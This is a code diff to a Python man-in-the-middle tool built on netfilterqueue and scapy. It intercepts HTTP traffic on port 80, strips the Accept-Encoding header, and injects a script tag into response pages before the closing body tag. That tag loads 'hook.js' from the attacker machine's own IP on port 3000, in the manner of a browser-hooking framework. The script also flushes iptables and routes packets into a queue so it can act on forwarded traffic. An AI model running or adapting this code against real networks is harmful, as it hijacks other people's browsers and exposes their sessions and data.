@@ -1,6 +1,8 @@
 import netfilterqueue
 from scapy.layers.l2 import Raw
 from scapy.layers.inet import IP, TCP
+from scapy.arch import get_if_addr
+from scapy.config import conf
 import argparse
 import os
 from termcolor import cprint
@@ -8,12 +10,11 @@ import re
 
 LINE = '____________________________________________________________'
 END_TAG = '</body>'
-SCRIPT_TAG = '<script>CODE</script>'
-PORT = 0
+IP_ADDRESS = get_if_addr(conf.iface) #IP of DEFAULT interface of MITM PC
+SCRIPT_TAG = '<script src="http://'+IP_ADDRESS+':3000/hook.js"></script>'
 
 #Process each packet
 def process_packet(packet):
-    global PORT
     IP_pkt = IP(packet.get_payload())
     
     if IP_pkt.haslayer(Raw) and IP_pkt.haslayer(TCP):
@@ -22,15 +23,13 @@ def process_packet(packet):
         try:
             load = IP_pkt[Raw].load.decode()
         
-            if IP_pkt[TCP].dport == PORT:
+            if IP_pkt[TCP].dport == 80:
                 cprint('Request', 'red', attrs=['bold',])
                 
                 '''Search for Accept-Encoding Header (?\\r\\n = stop at first occurrence of \\r\\n)
                 Remove Accept-Encoding header from request(we don't understand any encoding)
-                Remove also Chunked-Encoding by using HTTP/1.0
                 '''
                 load = re.sub('Accept-Encoding:.*?\\r\\n', '', load)
-                load = load.replace('HTTP/1.1', 'HTTP/1.0')
                 IP_pkt[Raw].load = load
 
                 #Scapy recomputes them
@@ -40,7 +39,7 @@ def process_packet(packet):
 
                 packet.set_payload(bytes(IP_pkt))
 
-            elif IP_pkt[TCP].sport == PORT:
+            elif IP_pkt[TCP].sport == 80:
                 cprint('Response', 'blue', attrs=['bold',])
                 load = injection_code(load)
 
@@ -84,46 +83,25 @@ def args_parser():
     parser = argparse.ArgumentParser()
     #Initialization of needed arguments
     parser.add_argument("-local", "-l", dest="local", help="If specified, IPTABLES updated to run program on local. Otherwise it works on forward machine (e.g. with arp spoofing).", action='store_true')
-    parser.add_argument("-file", "-f", dest="file", help="Name of javascript file to use.")
-    parser.add_argument("-https", dest="https", help="If specified, it bypass HTTPS connection. Otherwise, it works on HTTP connection.", action='store_true')
 
     #Parse command line arguments
     args = parser.parse_args()
-
-    if args.file and os.path.exists(args.file) and os.path.isfile(args.file) and ('.js') in args.file:
-        f = open(args.file, 'r')
-        code = f.read().replace('\n', '')
-        SCRIPT_TAG = SCRIPT_TAG.replace('CODE', code)
-        print(SCRIPT_TAG)
-    else:
-        cprint('\n\n[ERROR] Missing file', 'red', attrs=['bold',], end='\n\n')
-        parser.print_help()
-        exit(1)
-
-    return args.local, args.https
+    
+    return args.local
 
 
 def main():
-    global PORT
-    local, https = args_parser()
+    local = args_parser()
 
     #Packets are blocked and not forwarded
-    if local or https:
+    if local:
         os.system('iptables -F')
         os.system('iptables -I INPUT -j NFQUEUE --queue-num 0')
         os.system('iptables -I OUTPUT -j NFQUEUE --queue-num 0')
-        
-        if https:
-            os.system('iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000')
-    
     else:
         os.system('iptables -F')
         os.system('iptables -I FORWARD -j NFQUEUE --queue-num 0')
 
-    if https:
-        PORT = 10000
-    else:
-        PORT = 80
 
     #O = queue num
     queue = netfilterqueue.NetfilterQueue()
